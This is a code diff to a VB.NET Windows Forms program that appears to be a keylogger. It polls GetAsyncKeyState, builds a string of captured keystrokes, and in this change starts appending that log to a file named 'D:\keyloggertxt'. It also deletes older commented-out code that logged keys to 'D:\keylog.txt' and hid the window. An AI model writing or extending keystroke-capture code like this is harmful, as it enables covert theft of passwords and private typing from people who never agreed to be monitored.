@@ -1,15 +1,12 @@
 ﻿Imports System.IO
 
 Public Class Form1
-    'Dim i As Integer
-    'Dim result As Integer
     Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Integer
     Public Log As String
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
 
         Timer1.Start()
-        'intProcID = Shell("NOTEPAD.EXE", AppWinStyle.NormalFocus)
 
     End Sub
 
@@ -172,44 +169,8 @@ Public Class Form1
             Log = Log + "{F3}"
         End If
         TextBox1.Text = Log
+        Dim sw As New System.IO.StreamWriter("D:\keyloggertxt", True)
+        sw.WriteLine(Log)
+        sw.Close()
     End Sub
-
-
-    'Me.Visible = False
-
-
-    'For i = 3 To 255
-
-    '    Dim fi As FileInfo = New FileInfo("D:\keylog.txt")
-    '    Dim sw As StreamWriter
-    '    Dim ch As String
-
-    '    If GetAsyncKeyState(i) Then
-
-    '        ch = DirectCast(i, System.Windows.Forms.Keys).ToString
-
-    '        If ch.Length > 1 Then
-    '            ch = "ch"
-    '        End If
-
-    '        If fi.Exists = False Then
-    '            sw = fi.CreateText
-    '        Else
-    '            sw = fi.AppendText
-    '        End If
-
-
-    '        'AppActivate(intProcID)
-    '        ''OR ("Untitled - Notepad")'
-
-    '        'My.Computer.Keyboard.SendKeys(TextBox1.Text, True)
-
-    '        sw.Write(ch)
-    '        sw.Flush()
-    '        sw.Close()
-
-
-    '    End If
-
-    'Next
 End Class
